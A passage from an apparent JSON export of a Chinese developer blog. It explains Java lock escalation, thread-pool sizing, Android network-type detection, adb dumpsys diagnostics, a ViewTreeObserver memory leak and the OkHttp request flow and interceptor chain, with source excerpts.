偏向所锁，轻量级锁及重量级锁偏向所锁，轻量级锁都是乐观锁，重量级锁是悲观锁。一个对象刚开始实例化的时候，没有任何线程来访问它的时候。它是可偏向的，意味着，它现在认为只可能有一个线程来访问它，所以当第一个线程来访问它的时候，它会偏向这个线程，此时，对象持有偏向锁，偏向第一个线程。这个线程在修改对象头成为偏向锁的时候使用CAS操作，并将对象头中的ThreadID改成自己的ID，之后再次访问这个对象时，只需要对比ID，不需要再使用CAS在进行操作。一旦有第二个线程访问这个对象，因为偏向锁不会主动释放，所以第二个线程可以看到对象时偏向状态，这时表明在这个对象上已经存在竞争了，检查原来持有该对象锁的线程是否依然存活，如果挂了，则可以将对象变为无锁状态，然后重新偏向新的线程，如果原来的线程依然存活，则马上执行那个线程的操作栈，检查该对象的使用情况，如果仍然需要持有偏向锁，则偏向锁升级为轻量级锁，（偏向锁就是这个时候升级为轻量级锁的）。如果不存在使用了，则可以将对象回复成无锁状态，然后重新偏向。轻量级锁认为竞争存在，但是竞争的程度很轻，一般两个线程对于同一个锁的操作都会错开，或者说稍微等待一下（自旋），另一个线程就会释放锁。但是当自旋超过一定的次数，或者一个线程在持有锁，一个在自旋，又有第三个来访时，轻量级锁膨胀为重量级锁，重量级锁使除了拥有锁的线程以外的线程都阻塞，防止CPU空转。 综上所述，三种锁的状态如下： 偏向锁：首次同步访问时加入，在对象头表明偏向线程id 轻量级锁：检查偏向锁持有线程仍需要持有锁后升级，自旋处理 重量级锁：升级为轻量级锁后，自旋超过一定次数，或者出现第三个竞争线程时升级，阻塞处理 更详细内容可参考：https://www.cnblogs.com/deltadeblog/p/9559035.html 线程池线程数如何确定Java的线程池相信大家都不陌生，为了方便线程管理与复用，我们一般都会有使用线程池的习惯那么当我们创建线程池的时候，核心线程数如何确定呢？如果线程池的线程数定的太少，会导致CPU空转浪费资源，但如果线程池的线程数定的太多，则会导致CPU把大量的计算时间浪费在上下文切换上 关于线程数的确定，这里给出一个公式： 1线程数 = CPU核心数 * （1 + cpu等待时间/cpu总时间） + 1 博主个人是这样理解公式的，因为我们不能让CPU空转，因此线程数至少等于CPU核心数然后在考虑线程出现等待的情况较多的情况下，比如频繁io或者网路请求的场景，这种情况我们肯定是要增加线程数量的，否则CPU就会因为线程都是处于等待状态而空转，因此我们加上 CPU核心数 x cpu等待时间/cpu总时间 的线程数最后，考虑线程执行逻辑出现异常的情况，我们可以增加一个线程，在其他线程出现异常的情况下，使得CPU不会空转 而且，根据上面的公式，我们还可以推导出两个比较经典的场景： CPU密集型场景，即cpu等待时间/cpu总时间比值接近0，因此线程数一般定为 CPU核心数 + 1 IO密集型场景，即cpu等待时间/cpu总时间比值接近1，因此线程数一般定为 CPU核心数 x 2 + 1 参考资料：https://www.cnblogs.com/dennyzhangdd/p/6909771.html?utm_source=itdadao&amp;utm_medium=referralhttps://blog.csdn.net/varyall/article/details/79583036?utm_source=blogxgwz8 反射创建对象 与 new 创建对象区别在java中，我们既可以通过new来直接创建一个对象，也可以通过反射的api，使用Class.forName().newInstance()来创建对象那么这两者有何区别呢？ 当我们通过new来创建对象时，在编译期间内，对于我们创建对象的类型以及调用的构造函数方法，都是明确可知的因此这种方式创建对象会更快，而且JVM也会针对这种情况执行一系列的优化 当我们通过Class.forName().newInstance()来创建对象时，我们相当于使用了一种动态的方式来创建对象这种创建对象的方式会更慢，因为这时创建的对象类型并不是明确的，是不能硬编码到字节码中的并且JVM可能还需要进行权限的校验，确保执行的代码是否能调用构造函数创建对象并且JVM还需要对调用的构造函数进行检查，确保拥有跟我们参数匹配的构造函数 综上所述，反射创建对象 慢于 new 创建对象","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"Android常见问题总结（七）","slug":"Android常见问题总结（七）","date":"2019-03-29T13:24:18.000Z","updated":"2020-05-11T07:23:44.577Z","comments":true,"path":"2019/03/29/Android常见问题总结（七）/","link":"","permalink":"https://superxlcr.github.io/2019/03/29/Android常见问题总结（七）/","excerpt":"","text":"上一篇博客传送门：Android常见问题总结（六） 如何判断当前网络类型想要判断Android设备当前的网络类型，我们可以使用ConnectivityManager类 通过ConnectivityManager#getActiveNetworkInfo我们可以获取NetworkInfo类，它包含了当前网络相关的信息我们可以通过NetworkInfo#isAvailable来判断是否连上了网络通过NetworkInfo#getType来判断当前网络是否wifi类型 至于移动网络的类型，我们可以通过NetworkInfo#getSubtype获取网络的类型，然后通过TelephonyManager#getNetworkClass来判断当前的网络究竟是那种具体类型（不过这个方法是hide，估计是官方觉得不准确就不公开了，我们可以打开源码把该方法拷贝出来使用）具体判断网络类型的代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465 public static final String NETWORK_WIFI = \"Wifi\"; public static final String NETWORK_2G = \"2G\"; public static final String NETWORK_3G = \"3G\"; public static final String NETWORK_4G = \"4G\"; public static final String NETWORK_OTHER = \"Other\"; public static final String NETWORK_NONE = \"None\";/** * 获取当前网络类型 * @param context 上下文 * @return 网络类型 * * @see #NETWORK_NONE * @see #NETWORK_WIFI * @see #NETWORK_2G * @see #NETWORK_3G * @see #NETWORK_4G * @see #NETWORK_OTHER */ public static String getNetworkDetailType(Context context) &#123; if (context == null) &#123; return NETWORK_NONE; &#125; try &#123; ConnectivityManager manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); NetworkInfo info = manager.getActiveNetworkInfo(); // 判断是否无网络 if (info == null || !info.isAvailable()) &#123; return NETWORK_NONE; &#125; // 是否wifi if (info.getType() == ConnectivityManager.TYPE_WIFI) &#123; return NETWORK_WIFI; &#125; /** * 判断移动网络类型，可见 * @see TelephonyManager#getNetworkClass */ switch (info.getSubtype()) &#123; case TelephonyManager.NETWORK_TYPE_GPRS: case TelephonyManager.NETWORK_TYPE_EDGE: case TelephonyManager.NETWORK_TYPE_CDMA: case TelephonyManager.NETWORK_TYPE_1xRTT: case TelephonyManager.NETWORK_TYPE_IDEN: return NETWORK_2G; case TelephonyManager.NETWORK_TYPE_UMTS: case TelephonyManager.NETWORK_TYPE_EVDO_0: case TelephonyManager.NETWORK_TYPE_EVDO_A: case TelephonyManager.NETWORK_TYPE_HSDPA: case TelephonyManager.NETWORK_TYPE_HSUPA: case TelephonyManager.NETWORK_TYPE_HSPA: case TelephonyManager.NETWORK_TYPE_EVDO_B: case TelephonyManager.NETWORK_TYPE_EHRPD: case TelephonyManager.NETWORK_TYPE_HSPAP: return NETWORK_3G; case TelephonyManager.NETWORK_TYPE_LTE: return NETWORK_4G; default: return NETWORK_OTHER; &#125; &#125; catch (Exception e) &#123; L.exception(e); &#125; return NETWORK_NONE; &#125; 关于Android resources资源的问题可以参考官方文档解决问题：https://developer.android.com/guide/topics/resources/overview.html adb shell dumpsys 指令使用该命令用于打印出当前系统信息，默认打印出设备中所有service的信息，可以在命令后面加指定的service name. 有两种方法可以查看service list: adb shell dumpsys：输出信息的开始部分就是所有运行的service adb shell service list 只要我们在指令后添加对应service name，就能查看指定service的信息： adb shell dumpsys activity （查看activity堆栈相关信息）adb shell dumpsys display （查看显示相关信息，可以查看分辨率） 其中，有些service还可以带上额外的参数，我们可以使用 -h 来查看帮助信息：adb shell dumpsys activity -h （可以查到top等参数的用法） ListView中getView反复调用问题最近在项目中需要在ListView中实现计时器用TextView配合CountDownTimer实现完成后发现界面卡顿严重，通过debug发现ListView的Adapter在疯狂的调用getView方法猜测是由于CountDownTimer定时使用TextView#setText刷新文案，而TextView大小为wrap_content导致界面需要重新测量布局，导致ListView会反复调用Adapter#getView最终通过把TextView大小设为定值解决问题 此次顺便发现了刚进入页面时，Adapter#getView对于相同的position会调用多次的问题猜测也是ListView需要测量反复调用Adapter#getView所致，通过把ListView在xml中的高度由wrap_content改为match_parent或定值解决问题最终刚进入页面时，相同的position只会调用一次Adapter#getView ViewTreeObserver造成内存泄漏问题ViewTreeObserver的一般用法如下： 1234// 添加监听器view.getViewTreeObserver().addXXXListener(...);// 移除监听器view.getViewTreeObserver().removeXXXListener(...); 如果我们添加了监听器，而没有在View detach之前执行相应的移除方法，则会造成内存泄漏下面我们一起来看下具体的源码了解原因：View#getViewTreeObserver 123456789public ViewTreeObserver getViewTreeObserver() &#123; if (mAttachInfo != null) &#123; return mAttachInfo.mTreeObserver; &#125; if (mFloatingTreeObserver == null) &#123; mFloatingTreeObserver = new ViewTreeObserver(mContext); &#125; return mFloatingTreeObserver;&#125; 当view还没有attach到window的时候，其mAttachInfo为空，此时我们添加的监听器会被保存在mFloatingTreeObserver中 View#dispatchAttachedToWindow 12345678910void dispatchAttachedToWindow(AttachInfo info, int visibility) &#123; mAttachInfo = info; ... if (mFloatingTreeObserver != null) &#123; info.mTreeObserver.merge(mFloatingTreeObserver); mFloatingTreeObserver = null; &#125; ...&#125; 第5行可以看到attach到window的时候，会执行merge方法，把监听器合并到mAttachInfo中 ViewTreeObserver#merge 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283void merge(ViewTreeObserver observer) &#123; if (observer.mOnWindowAttachListeners != null) &#123; if (mOnWindowAttachListeners != null) &#123; mOnWindowAttachListeners.addAll(observer.mOnWindowAttachListeners); &#125; else &#123; mOnWindowAttachListeners = observer.mOnWindowAttachListeners; &#125; &#125; if (observer.mOnWindowFocusListeners != null) &#123; if (mOnWindowFocusListeners != null) &#123; mOnWindowFocusListeners.addAll(observer.mOnWindowFocusListeners); &#125; else &#123; mOnWindowFocusListeners = observer.mOnWindowFocusListeners; &#125; &#125; if (observer.mOnGlobalFocusListeners != null) &#123; if (mOnGlobalFocusListeners != null) &#123; mOnGlobalFocusListeners.addAll(observer.mOnGlobalFocusListeners); &#125; else &#123; mOnGlobalFocusListeners = observer.mOnGlobalFocusListeners; &#125; &#125; if (observer.mOnGlobalLayoutListeners != null) &#123; if (mOnGlobalLayoutListeners != null) &#123; mOnGlobalLayoutListeners.addAll(observer.mOnGlobalLayoutListeners); &#125; else &#123; mOnGlobalLayoutListeners = observer.mOnGlobalLayoutListeners; &#125; &#125; if (observer.mOnPreDrawListeners != null) &#123; if (mOnPreDrawListeners != null) &#123; mOnPreDrawListeners.addAll(observer.mOnPreDrawListeners); &#125; else &#123; mOnPreDrawListeners = observer.mOnPreDrawListeners; &#125; &#125; if (observer.mOnDrawListeners != null) &#123; if (mOnDrawListeners != null) &#123; mOnDrawListeners.addAll(observer.mOnDrawListeners); &#125; else &#123; mOnDrawListeners = observer.mOnDrawListeners; &#125; &#125; if (observer.mOnTouchModeChangeListeners != null) &#123; if (mOnTouchModeChangeListeners != null) &#123; mOnTouchModeChangeListeners.addAll(observer.mOnTouchModeChangeListeners); &#125; else &#123; mOnTouchModeChangeListeners = observer.mOnTouchModeChangeListeners; &#125; &#125; if (observer.mOnComputeInternalInsetsListeners != null) &#123; if (mOnComputeInternalInsetsListeners != null) &#123; mOnComputeInternalInsetsListeners.addAll(observer.mOnComputeInternalInsetsListeners); &#125; else &#123; mOnComputeInternalInsetsListeners = observer.mOnComputeInternalInsetsListeners; &#125; &#125; if (observer.mOnScrollChangedListeners != null) &#123; if (mOnScrollChangedListeners != null) &#123; mOnScrollChangedListeners.addAll(observer.mOnScrollChangedListeners); &#125; else &#123; mOnScrollChangedListeners = observer.mOnScrollChangedListeners; &#125; &#125; if (observer.mOnWindowShownListeners != null) &#123; if (mOnWindowShownListeners != null) &#123; mOnWindowShownListeners.addAll(observer.mOnWindowShownListeners); &#125; else &#123; mOnWindowShownListeners = observer.mOnWindowShownListeners; &#125; &#125; observer.kill();&#125; 分析过Activity的显示流程我们可以知道，这个attachInfo实际上是由ViewRootImpl来管理的，因此最终所有的监听器会被merge合并到ViewRootImpl中由于ViewRootImpl一般而言生命周期都是长于普通的View，而View从window执行detach的时候，我们可以看到其实是没有移除这些监听器的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647void dispatchDetachedFromWindow() &#123; AttachInfo info = mAttachInfo; if (info != null) &#123; int vis = info.mWindowVisibility; if (vis != GONE) &#123; onWindowVisibilityChanged(GONE); if (isShown()) &#123; // Invoking onVisibilityAggregated directly here since the subtree // will also receive detached from window onVisibilityAggregated(false); &#125; &#125; &#125; onDetachedFromWindow(); onDetachedFromWindowInternal(); InputMethodManager imm = InputMethodManager.peekInstance(); if (imm != null) &#123; imm.onViewDetachedFromWindow(this); &#125; ListenerInfo li = mListenerInfo; final CopyOnWriteArrayList&lt;OnAttachStateChangeListener&gt; listeners = li != null ? li.mOnAttachStateChangeListeners : null; if (listeners != null &amp;&amp; listeners.size() &gt; 0) &#123; // NOTE: because of the use of CopyOnWriteArrayList, we *must* use an iterator to // perform the dispatching. The iterator is a safe guard against listeners that // could mutate the list by calling the various add/remove methods. This prevents // the array from being modified while we iterate it. for (OnAttachStateChangeListener listener : listeners) &#123; listener.onViewDetachedFromWindow(this); &#125; &#125; if ((mPrivateFlags &amp; PFLAG_SCROLL_CONTAINER_ADDED) != 0) &#123; mAttachInfo.mScrollContainers.remove(this); mPrivateFlags &amp;= ~PFLAG_SCROLL_CONTAINER_ADDED; &#125; mAttachInfo = null; if (mOverlay != null) &#123; mOverlay.getOverlayView().dispatchDetachedFromWindow(); &#125; notifyEnterOrExitForAutoFillIfNeeded(false);&#125; 因此，如果我们注册了相应的监听器，在detach之前没有进行清理的话，我们的监听器会被ViewRootImpl一直持有从而导致内存泄漏修复方案一般是在View#onDetachedFromWindow中执行相应的清理方法即可","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"okhttp源码分析——基本流程（超详细）","slug":"okhttp源码分析——基本流程（超详细）","date":"2019-03-18T11:25:42.000Z","updated":"2020-05-11T07:23:44.780Z","comments":true,"path":"2019/03/18/okhttp源码分析——基本流程（超详细）/","link":"","permalink":"https://superxlcr.github.io/2019/03/18/okhttp源码分析——基本流程（超详细）/","excerpt":"","text":"本文转载自：https://www.jianshu.com/p/37e26f4ea57b 前言最近算是入了源码的坑了，什么东西总想按住ctrl看看源码的模样，这段时间在研究okhttp的源码，发现okhttp的源码完全不是简简单单的几天就可以啃下来的，那就一步一步来吧。这篇博客主要是从okhttp的总体流程分析源码的执行过程，对okhttp源码有大体上的理解，从全局上看出okhttp的设计思想。 分析OkHttpClient既然是流程分析，使用过okhttp的都了解，首先需要初始化一个OkHttpClient对象。OkHttp支持两种构造方式 1.默认方式 123public OkHttpClient() &#123; this(new Builder());&#125; 可以看到这种方式，不需要配置任何参数，也就是说基本参数都是默认的，调用的是下面的构造函数。 1OkHttpClient(Builder builder) &#123;...&#125; 2.builder模式，通过Builder配置参数，最后通过builder()方法返回一个OkHttpClient实例。 123public OkHttpClient build() &#123; return new OkHttpClient(this);&#125; OkHttpClient基本上就这样分析完了，里面的细节基本上就是用于初始化参数和设置参数的方法。所以也必要将大量的代码放上来占内容。。。,这里另外提一点，从OkHttpClient中可以看出什么设计模式哪？ builder模式 外观模式 Request构建完OkHttpClient后就需要构建一个Request对象，查看Request的源码你会发现，你找不多public的构造函数，唯一的一个构造函数是这样的。 1234567Request(Builder builder) &#123; this.url = builder.url; this.method = builder.method; this.headers = builder.headers.build(); this.body = builder.body; this.tag = builder.tag != null ? builder.tag : this;&#125; 这意味着什么，当然我们构建一个request需要用builder模式进行构建，那么就看一下builder的源码。 123456789101112131415161718192021public Builder newBuilder() &#123; return new Builder(this);&#125;//builder===================public Builder() &#123; this.method = \"GET\"; this.headers = new Headers.Builder();&#125;Builder(Request request) &#123; this.url = request.url; this.method = request.method; this.body = request.body; this.tag = request.tag; this.headers = request.headers.newBuilder();&#125;public Request build() &#123; if (url == null) throw new IllegalStateException(\"url == null\"); return new Request(this);&#125; 其实忽略其他的源码，既然这篇博客只是为了从总体流程上分析OkHttp的源码，所以我们主要着重流程源码上的分析。从上面的源码我们会发现，request的构建也是基于builder模式。 异步请求这里注意一下，这里分析区分一下同步请求和异步请求，但其实实质的执行流程除了异步外，基本都是一致的。 构建完Request后，我们就需要构建一个Call，一般都是这样的 1Call call = mOkHttpClient.newCall(request); 那么我们就返回OkHttpClient的源码看看。 1234567/*** Prepares the &#123;@code request&#125; to be executed at some point in the future.*/@Override public Call newCall(Request request) &#123;//工厂模式 return RealCall.newRealCall(this, request, false /* for web socket */);&#125; 可以看到，这里实质上调用的是RealCall中的newRealCall方法，但是这里需要注意一点，那就是方法前面的@Override注解，看到这个注解我们就要意识到，这个方法不是继承就是实现接口。 1public class OkHttpClient implements Cloneable, Call.Factory, WebSocket.Factory &#123;...&#125; 可以看到OkhttpClient实现了Call.Factory接口。 1234//Call.javainterface Factory &#123; Call newCall(Request request);&#125; 从接口源码我们也可以看出，这个接口其实并不复杂，仅仅是定义一个newCall用于创建Call的方法，这里其实用到了工厂模式的思想，将构建的细节交给具体实现，顶层只需要拿到Call对象即可。回到主流程，我们继续看RealCall中的newRealCall方法。 12345678910final class RealCall implements Call &#123;... static RealCall newRealCall(OkHttpClient client, Request originalRequest, boolean forWebSocket) &#123; // Safely publish the Call instance to the EventListener. RealCall call = new RealCall(client, originalRequest, forWebSocket); call.eventListener = client.eventListenerFactory().create(call); return call; &#125;...&#125; 可以看到RealCall实现了Call接口，newRealCall这是一个静态方法，new了一个RealCall对象，并创建了一个eventListener对象，从名字也可以看出，这个是用来监听事件流程，并且从构建方法我们也可以看出，使用了工厂模式 1234567private RealCall(OkHttpClient client, Request originalRequest, boolean forWebSocket) &#123; this.client = client; this.originalRequest = originalRequest; this.forWebSocket = forWebSocket; //默认创建一个retryAndFollowUpInterceptor过滤器 this.retryAndFollowUpInterceptor = new RetryAndFollowUpInterceptor(client, forWebSocket); &#125; 重点来了，可以看到，在RealCall的构造函数中，除了基本的赋值外，默认创建一个retryAndFollowUpInterceptor过滤器,过滤器可以说是OkHttp的巨大亮点，后续的文章我会详细分析一些过滤器吧（能力有限，尽量全看看）。现在Call创建完了，一般就到最后一个步骤了,将请求加入调度，一般的代码是这样的。 1234567891011//请求加入调度call.enqueue(new Callback() &#123; @Override public void onFailure(Request request, IOException e) &#123; &#125; @Override public void onResponse(final Response response) throws IOException &#123; //String htmlStr = response.body().string(); &#125;&#125;); 可以看到这里调用了call的enqueue方法，既然这里的call-&gt;RealCall，所以我们看一下RealCall的enqueue方法。 123456789@Override public void enqueue(Callback responseCallback) &#123; synchronized (this) &#123; if (executed) throw new IllegalStateException(\"Already Executed\"); executed = true; &#125; captureCallStackTrace(); eventListener.callStart(this); client.dispatcher().enqueue(new AsyncCall(responseCallback));&#125; 1.首先利用synchronized加入了对象锁，防止多线程同时调用，这里先判断一下executed是否为true判断当前call是否被执行了，如果为ture，则抛出异常，没有则设置为true。 2.captureCallStackTrace() 1234private void captureCallStackTrace() &#123; Object callStackTrace = Platform.get().getStackTraceForCloseable(\"response.body().close()\"); retryAndFollowUpInterceptor.setCallStackTrace(callStackTrace);&#125; 可以看到这里大体上可以理解为为retryAndFollowUpInterceptor加入了一个用于追踪堆栈信息的callStackTrace，后面有时间再详细分析一下这部分吧，不影响总体流程理解。 3. 1eventListener.callStart(this); 可以看到前面构建的eventListener起到作用了，这里先回调callStart方法。 4. 1client.dispatcher().enqueue(new AsyncCall(responseCallback)); 这里我们就需要先回到OkHttpClient的源码中。 123public Dispatcher dispatcher() &#123; return dispatcher;&#125; 可以看出返回了一个仅仅是返回了一个DisPatcher对象，那么就追到Dispatcher源码中。 12345678synchronized void enqueue(AsyncCall call) &#123; if (runningAsyncCalls.size() &lt; maxRequests &amp;&amp; runningCallsForHost(call) &lt; maxRequestsPerHost) &#123; runningAsyncCalls.add(call); executorService().execute(call); &#125; else &#123; readyAsyncCalls.add(call); &#125;&#125; 这里先对Dispatcher的成员变量做个初步的认识。 123456789101112131415161718public final class Dispatcher &#123; private int maxRequests = 64; private int maxRequestsPerHost = 5; private @Nullable Runnable idleCallback; /** Executes calls. Created lazily. */ private @Nullable ExecutorService executorService; /** Ready async calls in the order they'll be run. */ private final Deque&lt;AsyncCall&gt; readyAsyncCalls = new ArrayDeque&lt;&gt;(); /** Running asynchronous calls. Includes canceled calls that haven't finished yet. */ private final Deque&lt;AsyncCall&gt; runningAsyncCalls = new ArrayDeque&lt;&gt;(); /** Running synchronous calls. Includes canceled calls that haven't finished yet. */ private final Deque&lt;RealCall&gt; runningSyncCalls = new ArrayDeque&lt;&gt;(); ...&#125; 可以看到，这里用三个队列ArrayDeque用于保存Call对象，分为三种状态异步等待,同步running,异步running。所以这里的逻辑就比较清楚了。 12345678synchronized void enqueue(AsyncCall call) &#123; if (runningAsyncCalls.size() &lt; maxRequests &amp;&amp; runningCallsForHost(call) &lt; maxRequestsPerHost) &#123; runningAsyncCalls.add(call); executorService().execute(call); &#125; else &#123; readyAsyncCalls.add(call); &#125;&#125; 当正在执行的异步队列个数小于maxRequest(64)并且请求同一个主机的个数小于maxRequestsPerHost(5)时，则将这个请求加入异步执行队列runningAsyncCall，并用线程池执行这个call，否则加入异步等待队列。这里可以看一下runningCallsForHost方法。 12345678/** Returns the number of running calls that share a host with &#123;@code call&#125;. */private int runningCallsForHost(AsyncCall call) &#123; int result = 0; for (AsyncCall c : runningAsyncCalls) &#123; if (c.host().equals(call.host())) result++; &#125; return result;&#125; 其实也是很好理解的，遍历了runningAsyncCalls，记录同一个Host的个数。现在来看一个AsyncCall的源码，这块基本上是核心执行的地方了。 123final class AsyncCall extends NamedRunnable &#123; ...&#125; 看一个类，首先看一下这个类的结构，可以看到AsyncCall继承了NameRunnable类。 12345678910111213141516171819public abstract class NamedRunnable implements Runnable &#123; protected final String name; public NamedRunnable(String format, Object... args) &#123; this.name = Util.format(format, args); &#125; @Override public final void run() &#123; String oldName = Thread.currentThread().getName(); Thread.currentThread().setName(name); try &#123; execute(); &#125; finally &#123; Thread.currentThread().setName(oldName); &#125; &#125; protected abstract void execute();&#125; 可以看到NamedRunnable是一个抽象类，首先了Runnable接口，这就很好理解了，接着看run方法，可以看到，这里将当前执行的线程的名字设为我们在构造方法中传入的名字，接着执行execute方法，finally再设置回来。所以现在我们理所当然的回到AsyCall找execute方法了。 123456789101112131415161718192021222324@Override protected void execute() &#123; boolean signalledCallback = false; try &#123; //异步和同步走的是同样的方式，主不过在子线程中执行 Response response = getResponseWithInterceptorChain(); if (retryAndFollowUpInterceptor.isCanceled()) &#123; signalledCallback = true; responseCallback.onFailure(RealCall.this, new IOException(\"Canceled\")); &#125; else &#123; signalledCallback = true; responseCallback.onResponse(RealCall.this, response); &#125; &#125; catch (IOException e) &#123; if (signalledCallback) &#123; // Do not signal the callback twice! Platform.get().log(INFO, \"Callback failure for \" + toLoggableString(), e); &#125; else &#123; eventListener.callFailed(RealCall.this, e); responseCallback.onFailure(RealCall.this, e); &#125; &#125; finally &#123; client.dispatcher().finished(this); &#125;&#125; 终于，找到了Response的身影，那么就意味着执行网络请求就在getResponseWithInterceptorChain()方法中，后面的代码其实基本上就是一些接口回调，回调当前Call的执行状态，这里就不分析了，这里我们重点看一下getResponseWithInterceptorChain()这个方法，给我的感觉这个方法就是okHttp的精髓。 12345678910111213141516171819202122232425Response getResponseWithInterceptorChain() throws IOException &#123; // Build a full stack of interceptors. List&lt;Interceptor&gt; interceptors = new ArrayList&lt;&gt;(); interceptors.addAll(client.interceptors()); //失败和重定向过滤器 interceptors.add(retryAndFollowUpInterceptor); //封装request和response过滤器 interceptors.add(new BridgeInterceptor(client.cookieJar())); //缓存相关的过滤器，负责读取缓存直接返回、更新缓存 interceptors.add(new CacheInterceptor(client.internalCache())); //负责和服务器建立连接 interceptors.add(new ConnectInterceptor(client)); if (!forWebSocket) &#123; //配置 OkHttpClient 时设置的 networkInterceptors interceptors.addAll(client.networkInterceptors()); &#125; //负责向服务器发送请求数据、从服务器读取响应数据(实际网络请求) interceptors.add(new CallServerInterceptor(forWebSocket)); Interceptor.Chain chain = new RealInterceptorChain(interceptors, null, null, null, 0, originalRequest, this, eventListener, client.connectTimeoutMillis(), client.readTimeoutMillis(), client.writeTimeoutMillis()); return chain.proceed(originalRequest);&#125; 可以看到，这里首先new了一个Interceptor的ArrayList，然后分别加入了各种各样的Interceptor，所以当我们默认创建okHttpClient时，okHttp默认会给我们实现这些过滤器，每个过滤器执行不同的任务，这个思想太屌了有木有，每个过滤器负责自己的任务，各个过滤器间相互不耦合，高内聚，低耦合，对拓展放开巴拉巴拉等一系列设计思想有木有，这里可以对比一下Volley源码中的思想，Volley的处理是将缓存，网络请求等一系列操作揉在一起写，导致用户对于Volley的修改只能通过修改源码方式，而修改就必须要充分阅读理解volley整个的流程，可能一部分的修改会影响全局的流程，而这里，将不同的职责的过滤器分别单独出来，用户只需要对关注的某一个功能项进行理解，并可以进行扩充修改，一对比，okHttp在这方面的优势立马体现出来了。这里大概先描述一下几个过滤器的功能： retryAndFollowUpInterceptor——失败和重定向过滤器 BridgeInterceptor——封装request和response过滤器 CacheInterceptor——缓存相关的过滤器，负责读取缓存直接返回、更新缓存 ConnectInterceptor——负责和服务器建立连接，连接池等 networkInterceptors——配置 OkHttpClient 时设置的 networkInterceptors CallServerInterceptor——负责向服务器发送请求数据、从服务器读取响应数据(实际网络请求) 添加完过滤器后，就是执行过滤器了,这里也很重要，一开始看比较难以理解。 12345Interceptor.Chain chain = new RealInterceptorChain(interceptors, null, null, null, 0, originalRequest, this, eventListener, client.connectTimeoutMillis(), client.readTimeoutMillis(), client.writeTimeoutMillis());return chain.proceed(originalRequest); 可以看到这里创建了一个RealInterceptorChain，并调用了proceed方法，这里注意一下0这个参数。 12345678910111213141516171819202122232425262728293031323334353637383940414243public Response proceed(Request request, StreamAllocation streamAllocation, HttpCodec httpCodec, RealConnection connection) throws IOException &#123; if (index &gt;= interceptors.size()) throw new AssertionError(); calls++; // If we already have a stream, confirm that the incoming request will use it. if (this.httpCodec != null &amp;&amp; !this.connection.supportsUrl(request.url())) &#123; throw new IllegalStateException(\"network interceptor \" + interceptors.get(index - 1) + \" must retain the same host and port\"); &#125; // If we already have a stream, confirm that this is the only call to chain.proceed(). if (this.httpCodec != null &amp;&amp; calls &gt; 1) &#123; throw new IllegalStateException(\"network interceptor \" + interceptors.get(index - 1) + \" must call proceed() exactly once\"); &#125; // Call the next interceptor in the chain. RealInterceptorChain next = new RealInterceptorChain(interceptors, streamAllocation, httpCodec, connection, index + 1, request, call, eventListener, connectTimeout, readTimeout, writeTimeout); Interceptor interceptor = interceptors.get(index); Response response = interceptor.intercept(next); // Confirm that the next interceptor made its required call to chain.proceed(). if (httpCodec != null &amp;&amp; index + 1 &lt; interceptors.size() &amp;&amp; next.calls != 1) &#123; throw new IllegalStateException(\"network interceptor \" + interceptor + \" must call proceed() exactly once\"); &#125; // Confirm that the intercepted response isn't null. if (response == null) &#123; throw new NullPointerException(\"interceptor \" + interceptor + \" returned null\"); &#125; if (response.body() == null) &#123; throw new IllegalStateException( \"interceptor \" + interceptor + \" returned a response with no body\"); &#125; return response;&#125; 第一眼看，脑袋可能会有点发麻，稍微处理一下。 123456789101112131415161718public Response proceed(Request request, StreamAllocation streamAllocation, HttpCodec httpCodec, RealConnection connection) throws IOException &#123; if (index &gt;= interceptors.size()) throw new AssertionError(); calls++; ... // Call the next interceptor in the chain. RealInterceptorChain next = new RealInterceptorChain(interceptors, streamAllocation, httpCodec, connection, index + 1, request, call, eventListener, connectTimeout, readTimeout, writeTimeout); Interceptor interceptor = interceptors.get(index); Response response = interceptor.intercept(next); ... return response;&#125; 这样就很清晰了，这里index就是我们刚才的0，也就是从0开始，如果index超过了过滤器的个数抛出异常，后面会再new一个RealInterceptorChain，而且会将参数传递，并且index+1了，接着获取index的interceptor,并调用intercept方法，传入新new的next对象，这里可能就有点感觉了，这里用了递归的思想来完成遍历，为了验证我们的想法，随便找一个interceptor，看一下intercept方法。 1234567891011121314public final class ConnectInterceptor implements Interceptor &#123; public final OkHttpClient client; public ConnectInterceptor(OkHttpClient client) &#123; this.client = client; &#125; @Override public Response intercept(Chain chain) throws IOException &#123; RealInterceptorChain realChain = (RealInterceptorChain) chain; ...暂时没必要看... return realChain.proceed(request, streamAllocation, httpCodec, connection); &#125;&#125; 可以看到这里我们拿了一个ConnectInterceptor的源码，这里得到chain后，进行相应的处理后，继续调用proceed方法，那么接着刚才的逻辑，index+1,获取下一个interceptor,重复操作，所以现在就很清楚了，这里利用递归循环，也就是okHttp最经典的责任链模式。 同步请求异步看完，同步其实就很好理解了。 1234567891011121314151617181920212223242526/*** 同步请求*/@Override public Response execute() throws IOException &#123; //检查这个call是否运行过 synchronized (this) &#123; if (executed) throw new IllegalStateException(\"Already Executed\"); executed = true; &#125; captureCallStackTrace(); //回调 eventListener.callStart(this); try &#123; //将请求加入到同步队列中 client.dispatcher().executed(this); //创建过滤器责任链，得到response Response result = getResponseWithInterceptorChain(); if (result == null) throw new IOException(\"Canceled\"); return result; &#125; catch (IOException e) &#123; eventListener.callFailed(this, e); throw e; &#125; finally &#123; client.dispatcher().finished(this); &#125;&#125; 可以看到基本上流程都一致，除了是同步执行，核心方法走的还是getResponseWithInterceptorChain()方法。 okHttp流程 到这里okHttp的流程基本上分析完了，接下来就是对Inteceptor的分析了，这里献上一张偷来的图（原图来源-&gt;拆轮子系列：拆 OkHttp）便于理解流程，希望能分析完所有的Inteceptor吧！ 